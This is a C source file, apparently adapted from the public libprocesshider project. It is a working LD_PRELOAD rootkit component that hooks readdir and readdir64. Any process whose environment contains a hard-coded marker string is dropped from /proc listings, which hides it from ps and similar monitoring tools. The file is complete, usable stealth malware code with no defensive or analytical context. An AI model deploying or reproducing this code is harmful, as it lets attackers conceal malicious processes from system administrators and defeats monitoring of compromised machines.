// https://github.com/gianlucaborello/libprocesshider/blob/master/processhider.c
// https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/

#define _GNU_SOURCE

#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

/*
 * Every process with this name will be excluded
 */
static const char* process_to_filter = "hidden.sh";
static const char* process_wildcard_filter = "1337";
static const char* environ_password = "PYTERPRETER=YEET";

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

/*
 * Get a process name given its pid
 */
static int get_process_name(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
 
    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    if(fgets(tmp, sizeof(tmp), f) == NULL) {
        fclose(f);
        return 0;
    }

    fclose(f);

    int unused;
    sscanf(tmp, "%d (%[^)]s", &unused, buf);
    return 1;
}


/*
 * Get a process environ given its pid
 */
static int get_process_environ(char* pid, char* buf)
{
    if(strspn(pid, "0123456789") != strlen(pid)) {
        return 0;
    }

    char tmp[256];
    snprintf(tmp, sizeof(tmp), "/proc/%s/environ", pid);
 
    FILE* f = fopen(tmp, "r");
    if(f == NULL) {
        return 0;
    }

    // if(fgets(buf, sizeof(buf), f) == NULL) {
    if (fread(buf, 1, 4096, f) == 0) {
        fclose(f);
        return 0;
    }

    fclose(f);
    for (int i = 0; i < 4096; i++) {
        if (buf[i] == '\0') {
            buf[i] = '\n';
        }
    }

    // snprintf(tmp, sizeof(tmp), "/tmp/%s", pid);
    // FILE* file_dst = fopen(tmp, "wb");
    // fwrite(buf, 1, 4096, file_dst);
    // fclose(file_dst);
    // fprintf(stderr, "Got process env: \n%s\n", buf);
    return 1;
}

#define DECLARE_READDIR(dirent, readdir)                                \
static struct dirent* (*original_##readdir)(DIR*) = NULL;               \
                                                                        \
struct dirent* readdir(DIR *dirp)                                       \
{                                                                       \
    if(original_##readdir == NULL) {                                    \
        original_##readdir = dlsym(RTLD_NEXT, #readdir);                \
        if(original_##readdir == NULL)                                  \
        {                                                               \
            fprintf(stderr, "Error in dlsym: %s\n", dlerror());         \
        }                                                               \
    }                                                                   \
                                                                        \
    struct dirent* dir;                                                 \
                                                                        \
    while(1)                                                            \
    {                                                                   \
        dir = original_##readdir(dirp);                                 \
        if(dir) {                                                       \
            char dir_name[256];                                         \
            char process_name[256];                                     \
            char process_environ[4096];                                 \
            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &&        \
                strcmp(dir_name, "/proc") == 0 &&                       \
                /*get_process_name(dir->d_name, process_name) &&          \
                (                                                       \
                strcmp(process_name, process_to_filter) == 0 ||         \
                strstr(process_name, process_wildcard_filter) != NULL   \
                )*/                                                       \
                get_process_environ(dir->d_name, process_environ) &&    \
                strstr(process_environ, environ_password) != NULL       \
            ) {                                                         \
                continue;                                               \
            }                                                           \
        }                                                               \
        break;                                                          \
    }                                                                   \
    return dir;                                                         \
}

DECLARE_READDIR(dirent64, readdir64);
DECLARE_READDIR(dirent, readdir);
